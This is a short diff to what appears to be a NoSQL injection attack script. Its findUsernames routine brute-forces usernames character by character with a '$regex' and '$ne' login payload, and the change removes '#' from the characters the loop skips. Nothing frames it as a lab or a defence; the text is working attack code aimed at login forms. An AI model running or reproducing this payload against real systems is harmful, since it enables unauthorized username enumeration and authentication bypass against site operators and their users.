@@ -21,7 +21,7 @@ def findUsernames():
     while True:
         hit = False
         for c in string.printable:
-            if c not in ['*','+','.','?','|', '#', '&', '$', '^']:
+            if c not in ['*','+','.','?','|', '&', '$', '^']:
                 payload='username[$regex]=^%s&password[$ne]=nopes' % (urllib.quote_plus(username + c))
                 clear()
                 print("Scouting Username: " + username + c)
